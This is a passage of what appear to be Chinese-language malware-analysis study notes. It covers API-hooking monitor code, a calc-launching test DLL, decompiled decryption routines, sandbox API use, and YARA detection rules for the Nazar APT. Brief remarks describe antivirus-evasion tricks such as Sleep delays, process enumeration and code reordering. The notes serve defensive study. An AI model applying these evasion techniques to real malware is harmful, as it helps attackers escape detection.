lpBuffer,nSize,lpNumberOfBytesWritten);</span><br><span class="line">		WriteProcessMemoryHooker.Rehook();</span><br><span class="line">		return st;</span><br><span class="line">	&#125;</span><br><span class="line">	if(reply==PEDOLL_EXECUTE_REJECT)</span><br><span class="line">	&#123;</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	if (reply==PEDOLL_EXECUTE_TERMINATE)</span><br><span class="line">		exit(0);</span><br><span class="line"></span><br><span class="line">	return FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">APIHooker RegOpenKeyExAHooker;</span><br><span class="line">LSTATUS	APIENTRY hook_RegOpenKeyExA(</span><br><span class="line">	__in HKEY hKey,</span><br><span class="line">	__in_opt LPCSTR lpSubKey,</span><br><span class="line">	__in_opt DWORD ulOptions,</span><br><span class="line">	__in REGSAM samDesired,</span><br><span class="line">	__out PHKEY phkResult</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwesp;</span><br><span class="line">	_asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov dwesp,esp</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	if (hKey == HKEY_CLASSES_ROOT)</span><br><span class="line">	&#123;</span><br><span class="line">		sprintf(HookMessage, &quot;%s &lt;%s&gt; &lt;%s&gt;&quot;,PEDOLL_QUERY_REGOPENKEYEXA, &quot;HKEY_CLASSES_ROOT&quot;, lpSubKey);</span><br><span class="line">	&#125;</span><br><span class="line">	if (hKey == HKEY_CURRENT_CONFIG)</span><br><span class="line">	&#123;</span><br><span class="line">		sprintf(HookMessage, &quot;%s &lt;%s&gt; &lt;%s&gt;&quot;,PEDOLL_QUERY_REGOPENKEYEXA, &quot;HKEY_CURRENT_CONFIG&quot;, lpSubKey);</span><br><span class="line">	&#125;</span><br><span class="line">	if (hKey == HKEY_CURRENT_USER)</span><br><span class="line">	&#123;</span><br><span class="line">		sprintf(HookMessage, &quot;%s &lt;%s&gt; &lt;%s&gt;&quot;,PEDOLL_QUERY_REGOPENKEYEXA, &quot;HKEY_CURRENT_USER&quot;, lpSubKey);</span><br><span class="line">	&#125;</span><br><span class="line">	if (hKey == HKEY_LOCAL_MACHINE)</span><br><span class="line">	&#123;</span><br><span class="line">		sprintf(HookMessage, &quot;%s &lt;%s&gt; &lt;%s&gt;&quot;,PEDOLL_QUERY_REGOPENKEYEXA, &quot;HKEY_LOCAL_MACHINE&quot;, lpSubKey);</span><br><span class="line">	&#125;</span><br><span class="line">	if (hKey == HKEY_USERS)</span><br><span class="line">	&#123;</span><br><span class="line">		sprintf(HookMessage, &quot;%s &lt;%s&gt; &lt;%s&gt;&quot;,PEDOLL_QUERY_REGOPENKEYEXA, &quot;HKEY_USERS&quot;, lpSubKey);</span><br><span class="line">	&#125;</span><br><span class="line">	int reply = MonitorQuery(HookMessage,dwesp);</span><br><span class="line"></span><br><span class="line">	if (reply == PEDOLL_EXECUTE_PASS)</span><br><span class="line">	&#123;</span><br><span class="line">		RegOpenKeyExAHooker.Unhook();</span><br><span class="line">		LSTATUS st= RegOpenKeyExA(hKey, lpSubKey, ulOptions, samDesired, phkResult);</span><br><span class="line">		RegOpenKeyExAHooker.Rehook();</span><br><span class="line">		return st;</span><br><span class="line">	&#125;</span><br><span class="line">	if(reply==PEDOLL_EXECUTE_REJECT)</span><br><span class="line">	&#123;</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	if (reply==PEDOLL_EXECUTE_TERMINATE)</span><br><span class="line">		exit(0);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="dll加载器"><a class="markdownIt-Anchor" href="#dll加载器">#</a> DLL 加载器</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// 新建一个dll文件</span><br><span class="line">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI Load()</span><br><span class="line">&#123;</span><br><span class="line">	return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">					 )</span><br><span class="line">&#123;</span><br><span class="line">	switch (ul_reason_for_call)</span><br><span class="line">	&#123;</span><br><span class="line">	case DLL_PROCESS_ATTACH:</span><br><span class="line">		&#123;</span><br><span class="line">			MessageBoxA(0,0,0,0);</span><br><span class="line">			WinExec(&quot;calc.exe&quot;,SW_SHOW);</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	case DLL_THREAD_ATTACH:</span><br><span class="line">	case DLL_THREAD_DETACH:</span><br><span class="line">	case DLL_PROCESS_DETACH:</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 新建一个def导出</span><br><span class="line">LIBRARY	&quot;Dllll&quot;</span><br><span class="line">EXPORTS</span><br><span class="line">Load</span><br></pre></td></tr></table></figure>
<p>判断 DLL 是否导出，用 OD 打开 ctrl+N</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231003182951007.png" alt="image-20231003182951007"></p>
<p>给 PE.dll 增加一个节，放入我们的 dll</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231003183518328.png" alt="image-20231003183518328"></p>
<p>DLL 会弹窗，此时用 od 附加 dllloader</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231003185339480.png" alt="image-20231003185339480"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231003185550065.png" alt="image-20231003185550065"></p>
<h3 id="通过dll导出函数进行加载调试"><a class="markdownIt-Anchor" href="#通过dll导出函数进行加载调试">#</a> 通过 dll 导出函数进行加载调试</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 通过IDA F5源代码</span><br><span class="line">// 在vc2008中调用</span><br><span class="line">typedef BOOL (WINAPI* apiInstall)(int a1, BYTE *lpData, int a3, int a4);</span><br><span class="line">apiInstall MyInstall;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	MyInstall = (apiInstall)GetProcAddr(Loadlibrary(&quot;ser.dll&quot;),&quot;Install&quot;);</span><br><span class="line">	if(MyInstall)</span><br><span class="line">	&#123;</span><br><span class="line">		BYTE *lData = NULL;</span><br><span class="line">		MyInstall(0,lData,0,0);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在通过 OD 调，到 DLL 领空，即可分析 dll 所有功能</p>
<h3 id="使用火绒hips进行快速分析"><a class="markdownIt-Anchor" href="#使用火绒hips进行快速分析">#</a> 使用火绒 HIPS 进行快速分析</h3>
<ul>
<li>
<p>恶意软件 恶意软件（Malware）是指包括木马、后门、蠕虫、感染型病毒等在内的各种包含恶意 代码文件的统称。由于早期的恶意软件基本都属于感染型病毒，所以通常我们也将恶意软件 统称为病毒。 从 2007 年左右开始，得益于互联网的快速普及，恶意软件数量呈现快速增长的趋势。 传播方式也从之前的文件感染、局域网传播等传统方式迅速转变为通过社工、挂马等互联网 化的传播方式。早期常被应用于感染型病毒的代码多态、变形技术被应用于恶意软件生成器、 混淆器等，恶意软件作者通过混淆器不断快速迭代生成新恶意样本，以此来对抗安全软件的 查杀。 灰色软件 灰色软件一般指广告类（Adware）程序，这类程序往往会通过弹出广告等方式诱导、 欺骗甚至是恐吓用户以达到推广获利的目的。这类程序不属于一般意义上安全行业内对恶意 软件的定义，但却对用户正常使用电脑产生极坏的影响。 基于上述原因，不同安全软件也采取了不同的策略来进行应对，多数安全软件会把此类 程序识别为广告程序（Adware），或潜在不受欢迎程序 (Potentially Unwanted Application， 即 PUA），或类似卡巴斯基检出的病毒名以 not-a-virus: 开头的威胁。</p>
</li>
<li>
<p>火绒主动防御系统率先将单步防御和多步恶意监控相结合，不依赖白名单，消除了信任漏洞，自上而下地在所有可能的威胁入口设计独特的防御策略，共同有效地防御不同类型的恶意威胁。同时还能实时感知动态的系统级威胁行为信息，是终端威胁探针的重要组成部分。</p>
<p>该防御系统在文件、注册表、进程、网络这四个维度均设计了全面的防护规则，有效地针对操作系统的脆弱点进行防护。单步防御模块还开放了自定义规则功能，允许用户自行编写防护规则，制订适合自身需求的防御、隐私保护规则。</p>
</li>
</ul>
<h2 id="exe-恶意文件分析"><a class="markdownIt-Anchor" href="#exe-恶意文件分析">#</a> EXE 恶意文件分析</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9zLnRocmVhdGJvb2suY29tLw==">https://s.threatbook.com/</span></p>
<ol>
<li>基于多款反病毒引擎检测，快速检测已知威胁</li>
<li>利用虚拟化沙箱深度分析技术，实现恶意文件自动化、可定制化的行为分析，检测未知威胁</li>
<li>集成微步多个核心的高级情报分析系统，对文件运行过程中的网络、主机行为进行智能化的威胁判定，产出可直接用于失陷检测和应急分析的 IOC</li>
<li>支持识别和检测反沙箱恶意软件，防止恶意软件逃避虚拟机检查</li>
</ol>
<p>情报 IOC</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004170516677.png" alt="image-20231004170516677"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004164602073.png" alt="image-20231004164602073"></p>
<p>流量分析：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004165058553.png" alt="image-20231004165058553"></p>
<p>找程序入口：通过 IDA 打开，找到 WinMain 函数地址，在 OD 查找，段首下段</p>
<p>可以绕过异常链上中断的 OD 检测</p>
<p>通过 API 进行可疑行为，同样可以在 OD 中下段，找到函数调用</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004165411084.png" alt="image-20231004165411084"></p>
<p>调用 Sleep 函数做延迟，绕过分析。</p>
<p>默认内存分页不可读不可写</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004170112847.png" alt="image-20231004170112847"></p>
<p>遍历进程找杀软，OD BP CreateToolhelpSnapShot</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004170228525.png" alt="image-20231004170228525"></p>
<p>查 PDB 可以获得文件编译日志，可以用于溯源取证</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004170617837.png" alt="image-20231004170617837"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004171644459.png" alt="image-20231004171644459"></p>
<h3 id="解密函数分析"><a class="markdownIt-Anchor" href="#解密函数分析">#</a> 解密函数分析</h3>
<p>定位到解密函数，直接用 IDA F5</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004174240722.png" alt="image-20231004174240722"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004174147211.png" alt="image-20231004174147211"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl sub_401FB0(unsigned int *a1, signed int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">	signed int v3; // ebx@1</span><br><span class="line">	int v4; // ecx@2</span><br><span class="line">	unsigned int v5; // eax@2</span><br><span class="line">	unsigned int v6; // esi@4</span><br><span class="line">	unsigned int v7; // ebp@4</span><br><span class="line">	unsigned __int8 v8; // bl@5</span><br><span class="line">	unsigned __int8 v9; // bl@6</span><br><span class="line">	signed int v10; // ebx@9</span><br><span class="line">	unsigned int v11; // ebp@9</span><br><span class="line">	unsigned int v12; // eax@9</span><br><span class="line">	int v13; // esi@11</span><br><span class="line">	int v14; // ebp@11</span><br><span class="line">	unsigned __int8 v15; // bl@12</span><br><span class="line">	unsigned __int8 v16; // bl@14</span><br><span class="line">	char v17; // dl@14</span><br><span class="line">	int v18; // esi@14</span><br><span class="line">	char v19; // cl@14</span><br><span class="line">	char v20; // bl@14</span><br><span class="line">	unsigned __int8 v21; // bl@14</span><br><span class="line">	char v22; // [sp+10h] [bp-8h]@4</span><br><span class="line">	int v23; // [sp+10h] [bp-8h]@9</span><br><span class="line">	int v24; // [sp+14h] [bp-4h]@2</span><br><span class="line">	int v25; // [sp+14h] [bp-4h]@9</span><br><span class="line">	signed int v26; // [sp+20h] [bp+8h]@9</span><br><span class="line"></span><br><span class="line">	v3 = a2;</span><br><span class="line">	if ( a2 &lt;= 1 )</span><br><span class="line">	&#123;</span><br><span class="line">		if ( a2 &lt; -1 )</span><br><span class="line">		&#123;</span><br><span class="line">			v10 = -a2;</span><br><span class="line">			v26 = v10;</span><br><span class="line">			v25 = 52 / v10 + 6;</span><br><span class="line">			v11 = -1640531527 * v25;</span><br><span class="line">			v23 = -1640531527 * v25;</span><br><span class="line">			v12 = *(BYTE *)a1;</span><br><span class="line">			while ( 1 )</span><br><span class="line">			&#123;</span><br><span class="line">				v13 = v10 - 1;</span><br><span class="line">				v14 = (v11 &gt;&gt; 2) &amp; 3;</span><br><span class="line">				if ( v10 != 1 )</span><br><span class="line">				&#123;</span><br><span class="line">					do</span><br><span class="line">					&#123;</span><br><span class="line">						v15 = *((BYTE *)a1 + v13)</span><br><span class="line">							- (((v12 ^ v23) + (*((BYTE *)a1 + v13 - 1) ^ *(BYTE *)(a3 + 4 * (v14 ^ v13 &amp; 3)))) ^ ((4 * v12 ^ (*((BYTE *)a1 + v13 - 1) &gt;&gt; 5)) + (16 * *((BYTE *)a1 + v13 - 1) ^ (v12 &gt;&gt; 3))));</span><br><span class="line">						*((BYTE *)a1 + v13) = v15;</span><br><span class="line">						v12 = v15;</span><br><span class="line">						--v13;</span><br><span class="line">					&#125;</span><br><span class="line">					while ( v13 );</span><br><span class="line">					v10 = v26;</span><br><span class="line">				&#125;</span><br><span class="line">				v16 = *((BYTE *)a1 + v10 - 1);</span><br><span class="line">				v17 = (4 * v12 ^ (v16 &gt;&gt; 5)) + (16 * v16 ^ (v12 &gt;&gt; 3));</span><br><span class="line">				v18 = v14 ^ v13 &amp; 3;</span><br><span class="line">				v11 = v23 + 1640531527;</span><br><span class="line">				v19 = v16 ^ *(BYTE *)(a3 + 4 * v18);</span><br><span class="line">				v20 = v12 ^ v23;</span><br><span class="line">				v23 += 1640531527;</span><br><span class="line">				v21 = *(BYTE *)a1 - ((v20 + v19) ^ v17);</span><br><span class="line">				*(BYTE *)a1 = v21;</span><br><span class="line">				v12 = v21;</span><br><span class="line">				--v25;</span><br><span class="line">				if ( !v25 )</span><br><span class="line">					break;</span><br><span class="line">				v10 = v26;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		v4 = 0;</span><br><span class="line">		v24 = 52 / a2 + 6;</span><br><span class="line">		v5 = *((BYTE *)a1 + a2 - 1);</span><br><span class="line">		while ( 1 )</span><br><span class="line">		&#123;</span><br><span class="line">			v6 = 0;</span><br><span class="line">			v22 = v4 - 71;</span><br><span class="line">			v7 = ((unsigned int)(v4 - 1640531527) &gt;&gt; 2) &amp; 3;</span><br><span class="line">			if ( v3 != 1 )</span><br><span class="line">			&#123;</span><br><span class="line">				do</span><br><span class="line">				&#123;</span><br><span class="line">					v8 = (((*((BYTE *)a1 + v6 + 1) ^ v22) + (v5 ^ *(BYTE *)(a3 + 4 * (v7 ^ v6 &amp; 3)))) ^ ((4</span><br><span class="line">						* *((BYTE *)a1 + v6 + 1) ^ (v5 &gt;&gt; 5))</span><br><span class="line">						+ (16 * v5 ^ (*((BYTE *)a1 + v6 + 1) &gt;&gt; 3))))</span><br><span class="line">						+ *((BYTE *)a1 + v6);</span><br><span class="line">					*((BYTE *)a1 + v6) = v8;</span><br><span class="line">					v5 = v8;</span><br><span class="line">					++v6;</span><br><span class="line">				&#125;</span><br><span class="line">				while ( v6 &lt; a2 - 1 );</span><br><span class="line">			&#125;</span><br><span class="line">			v4 -= 1640531527;</span><br><span class="line">			v9 = (((*(BYTE *)a1 ^ v22) + (v5 ^ *(BYTE *)(a3 + 4 * (v7 ^ v6 &amp; 3)))) ^ ((4 * *(BYTE *)a1 ^ (v5 &gt;&gt; 5))</span><br><span class="line">				+ (16 * v5 ^ (*(BYTE *)a1 &gt;&gt; 3))))</span><br><span class="line">				+ *((BYTE *)a1 + a2 - 1);</span><br><span class="line">			*((BYTE *)a1 + a2 - 1) = v9;</span><br><span class="line">			v5 = v9;</span><br><span class="line">			--v24;</span><br><span class="line">			if ( !v24 )</span><br><span class="line">				break;</span><br><span class="line">			v3 = a2;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>加载 DLL</p>
<p>通过更改代码顺序和 nop 实现免杀</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231004174419662.png" alt="image-20231004174419662"></p>
<p>分析 dll</p>
<p>可以直接从 GetDiskFreeSpaceExA   /   Sleep 下断回溯到 dll 中</p>
<h3 id="样本规则库编写"><a class="markdownIt-Anchor" href="#样本规则库编写">#</a> 样本规则库编写</h3>
<p>yarn 规则编写</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vU3Vuc2V0Ui9wLzEyNjUwMzI1Lmh0bWw=">https://www.cnblogs.com/SunsetR/p/12650325.html</span></li>
</ul>
<ol>
<li>
<p>项目：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3ZpcnVzdG90YWwveWFyYQ==">https://github.com/virustotal/yara</span></p>
<p>releases：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1ZpcnVzVG90YWwveWFyYS9yZWxlYXNlcw==">https://github.com/VirusTotal/yara/releases</span></p>
</li>
</ol>
<p>Yara 规则语法类似于 C 语言，易于编写和理解，每个规则都以关键字 “rule” 开头，后面跟着一个规则标识符。</p>
<p>标识符必须遵循与 C 语言相同的词法约定，它们可以包含任何字母数字和下划线，但第一个字符不能是数字。</p>
<p>规则标识符区分大小写，并且不能超过 128 个字符。以下关键字是保留的，不能用作标识：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">rule apt_ZZ_SIG37_NAZAR_GpUpdatesExe</span><br><span class="line">&#123;</span><br><span class="line">	meta:</span><br><span class="line">		desc = &quot;SIG37 GpUpdates dropper, Chilkat Zip2Secure&quot;</span><br><span class="line">		author = &quot;JAG-S&quot;</span><br><span class="line">		hash = &quot;75e4d73252c753cd8e177820eb261cd72fecd7360cc8ec3feeab7bd129c01ff6&quot;</span><br><span class="line">	strings:</span><br><span class="line">		$open = &quot;open&quot; ascii wide fullword</span><br><span class="line">		$regsrv = &quot;regsvr32.exe&quot; ascii wide</span><br><span class="line">		$filename1 = &quot;Godown.dll -s&quot; ascii wide</span><br><span class="line">		$filename2 = &quot;ViewScreen.dll -s&quot; ascii wide</span><br><span class="line">		$filename3 = &quot;Filesystem.dll -s&quot; ascii wide</span><br><span class="line"></span><br><span class="line">	condition:</span><br><span class="line">		uint16(0) == 0x5a4d</span><br><span class="line">		and</span><br><span class="line">		($open and $regsrv and (1 of ($filename*))) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="云沙盘api使用方法"><a class="markdownIt-Anchor" href="#云沙盘api使用方法">#</a> 云沙盘 API 使用方法</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly94LnRocmVhdGJvb2suY29tL3Y1L2FwaURvY3M=">API 文档 (threatbook.com)</span></p>
<ol>
<li>
<p>apikey 是 stringAPI 请求的身份识别标识。2resource 是 stringIP 地址，目前支持单个查询。3exclude 可选 string 可根据实际使用场景排除以下参数，返回结果信息，多个参数请以逗号分隔（注意不要有空格）。</p>
</li>
<li>
<p>asn：asn 信息。</p>
</li>
<li>
<p>ports：端口信息。</p>
</li>
<li>
<p>cas：SSL 证书等信息。</p>
</li>
<li>
<p>rdns_list：rdns 记录信息。</p>
</li>
<li>
<p>intelligences：威胁情报。</p>
</li>
<li>
<p>judgments：从威胁情报中分析，综合判定的威胁类型。</p>
</li>
<li>
<p>tags_classes：相关攻击团伙或安全事件信息标签等。</p>
</li>
<li>
<p>samples：相关样本。</p>
</li>
<li>
<p>update_time：情报最近更新时间。</p>
</li>
<li>
<p>sum_cur_domains：当前指向域名的数量。</p>
</li>
<li>
<p>scene：应用场景。</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">url = &#x27;https://api.threatbook.cn/v3/file/upload&#x27;;</span><br><span class="line">fields = &#123;</span><br><span class="line">    &#x27;apikey&#x27;: &#x27;请替换apikey&#x27;,</span><br><span class="line">    &#x27;sandbox_type&#x27;: &#x27;win7_sp1_enx86_office2013&#x27;,</span><br><span class="line">    &#x27;run_time&#x27;: 60</span><br><span class="line">  &#125;</span><br><span class="line">file_dir = &#x27;请替换文件地址&#x27;</span><br><span class="line">file_name = &#x27;myfile.exe&#x27;</span><br><span class="line">files = &#123;</span><br><span class="line">  &#x27;file&#x27; : (file_name, open(os.path.join(file_dir, file_name), &#x27;rb&#x27;))</span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url, data=fields, files=files)</span><br><span class="line">print(response.json())</span><br></pre></td></tr></table></figure>
<h2 id="apt攻击链恶意样本分析"><a class="markdownIt-Anchor" href="#apt攻击链恶意样本分析">#</a> APT 攻击链恶意样本分析</h2>
<p>APT（AdvancedPersistent Threat）高级持续性威胁。是指组织 (特别是政府) 或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。APT 是黑客以窃取核心资料为目的，针对客户所发动的网络攻击和侵袭行为。</p>
<p>替换服务 svchost.exe 替换</p>
<p>APT 的攻击手法，在于隐匿自己，针对特定对象，长期、有计划性和组织性地窃取数据，此类攻击行为是传统安全检测系统无法有效检测发现，前沿防御方法是利用非商业化虚拟机分析技术，对各种邮件附件、文件进行深度的动态行为分析，发现利用系统漏洞等高级技术专门构造的恶意文件，从而发现和确认 APT 攻击行为。由于 APT 的特性，导致难发现、潜在威胁大，一旦被攻击将导致企业、政府、医疗组织等等的大量数据被窃取，公司重要财务、机密被盗窃。</p>
<ul>
<li>Nazar APT 组织分析</li>
</ul>
<p>三年前左右，在 2017 年 4 月 14 日，一个神秘的黑客组织影子经纪人（Shadow Brokers）在互联网上公布了一系列的黑客工具和漏洞，这些曾经被 NSA 利用的工具 / 漏洞一定程度上给互联网带来了大地震。</p>
<p>这批泄露中涵盖多种黑客工具和不同的漏洞，例如 Windows 的 “永恒之蓝” 漏洞，就是造成 WannaCry 以及后来 NotPetya 勒索软件席卷全球的最大元凶。除此之外，研究人员还发现了更多未知内容，尝试解读出其中隐藏的各种秘密。</p>
<h3 id="关于sigspy文件"><a class="markdownIt-Anchor" href="#关于sigspy文件">#</a> 关于 Sigs.py 文件</h3>
<p>自从 3 年前影子经纪人泄露这批黑客工具以来，全球各地的安全研究人员就在积极研究，尽管可能出于不同目的，但总是想从中挖出点有用的信息来，整出一些大新闻。除了声名远播的 “永恒之蓝” 漏洞，其中还有一个名为 sigs.py 的文件，让很多研究人员大为痴迷。</p>
<p>Sigs.py 这个文件据说是作为一个精简版的恶意软件扫描器，被 NSA 部署在目标系统中，通过扫描目标系统是否存在一些行为特征，从而判断目标系统中是否还有其他 APT 存在。</p>
<p>这个文件中包含 44 个特征指纹（Signatures）用来检测其他 APT 组织的行为，编号为 1-45 号，其中不包括第 42 号。如果研究人员的推测是正确的，那么这个文件就表明 NSA 掌握至少 44 个 APT 组织的恶意行为特征，这远超目前公开的 APT 数量。</p>
<h3 id="nazar-样本分析"><a class="markdownIt-Anchor" href="#nazar-样本分析">#</a> Nazar 样本分析</h3>
<ul>
<li>Nazar APT 样本分析之一</li>
</ul>
<ol>
<li>
<pre><code>rule apt_ZZ_SIG37_NAZAR_GpUpdatesExe
&#123;
	meta:
		desc = &quot;SIG37 GpUpdates dropper, Chilkat Zip2Secure&quot;
		author = &quot;JAG-S&quot;
		hash = &quot;75e4d73252c753cd8e177820eb261cd72fecd7360cc8ec3feeab7bd129c01ff6&quot;
	strings:
		$open = &quot;open&quot; ascii wide fullword
		$regsrv = &quot;regsvr32.exe&quot; ascii wide
		$filename1 = &quot;Godown.dll -s&quot; ascii wide
		$filename2 = &quot;ViewScreen.dll -s&quot; ascii wide
		$filename3 = &quot;Filesystem.dll -s&quot; ascii wide

	condition:
		uint16(0) == 0x5a4d
		and
		($open and $regsrv and (1 of ($filename*))) 
&#125;
